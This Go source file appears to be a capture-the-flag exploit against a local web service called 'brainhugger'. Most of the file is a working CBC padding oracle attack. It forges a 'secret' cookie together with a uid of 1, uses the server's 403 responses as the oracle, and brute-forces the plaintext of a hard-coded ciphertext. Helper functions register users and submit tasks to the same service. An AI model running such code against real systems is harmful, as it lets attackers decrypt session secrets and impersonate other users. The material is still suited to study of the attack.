package main

import (
	"brainhugger/backend/cbc"
	"bytes"
	"encoding/base64"
	"encoding/json"
	"fmt"
	"io/ioutil"
	"math/rand"
	"net/http"
	"sync"
)

type Task struct {
	Source string
	Stdin  string
	Token  string
	OwnerId uint
}

type User struct {
	Password string
}

func addNewTask(wg *sync.WaitGroup, source, stdin, token string, owner uint) []byte {
	defer wg.Done()
	task := Task{
		Source:  source,
		Stdin:   stdin,
		Token:   token,
		OwnerId: owner,
	}
	data, err := json.Marshal(task)
	if err != nil {
		panic("can not marshal task: " + err.Error())
	}
	resp, err := http.Post("http://0.0.0.0:8080/run_task", "json", bytes.NewReader(data))
	if err != nil {
		panic("can not make post-request: " + err.Error())
	}
	if resp.StatusCode != 200 {
		panic(fmt.Sprintf("status code: %v", resp.StatusCode))
	}
	res, err := ioutil.ReadAll(resp.Body)
	if err != nil {
		panic("can not read body: " + err.Error())
	}
	return res
}

func addNewUser(wg *sync.WaitGroup, password string) []byte {
	defer wg.Done()
	user := User{
		Password: password,
	}
	data, err := json.Marshal(user)
	if err != nil {
		panic("can not marshal task: " + err.Error())
	}
	resp, err := http.Post("http://0.0.0.0:8080/register", "json", bytes.NewReader(data))
	if err != nil {
		panic("can not make post-request: " + err.Error())
	}
	if resp.StatusCode != 200 {
		panic(fmt.Sprintf("status code: %v", resp.StatusCode))
	}
	res, err := ioutil.ReadAll(resp.Body)
	if err != nil {
		panic("can not read body: " + err.Error())
	}
	return res
}

func tryDecr(encrypted []byte) bool {
	secretB64 := base64.StdEncoding.EncodeToString(encrypted)
	req, err := http.NewRequest("GET", "http://localhost:8080/task_info/4", nil)
	if err != nil {
		panic(err)
	}
	req.AddCookie(&http.Cookie{Name: "secret", Value: secretB64})
	req.AddCookie(&http.Cookie{Name: "uid", Value: "1"})
	client := &http.Client{}
	resp, err := client.Do(req)
	if err != nil {
		panic(err)
	}
	return resp.StatusCode == 403
}

func paddingOrcaleAttack(encrypted1 []byte) {
	encrypted := append(cbc.InitVector, encrypted1[:16]...)
	encryptedCopy := append(cbc.InitVector, encrypted1[:16]...)

	result := make([]byte, 16)

	i2 := make([]byte, 16)
	for k := 1; k < 17; k++ {
		for j := 0; j < k - 1; j++ {
			encrypted[15 - j] = i2[15 - j] ^ byte(k)
		}
		for i := 0; i < 256; i++ {
			if _, err1 := rand.Read(encrypted[:16 - k]); err1 != nil {
				panic(err1)
			}
			encrypted[16 - k] = byte(i)
			if tryDecr(encrypted) {
				i2[16 - k] = byte(i) ^ byte(k)
				result[16 - k] = i2[16 - k] ^ encryptedCopy[16 - k]
			}
		}
	}
	//result = result[:16 - result[len(result) - 1]]
	fmt.Println(string(result))
	fmt.Println(i2)
}

func main() {
	//secretB64 := "XwcPJnI7JRJyYo4WZH2S3Q=="
	//secret := []byte{95, 7, 15, 38, 114, 59, 37, 18, 114, 98, 142, 22, 100, 125, 146, 221}
	secret := []byte{95, 7, 15, 38, 114, 59, 37, 18, 114, 98, 142, 22, 100, 125, 146, 221}
	paddingOrcaleAttack(secret)
}
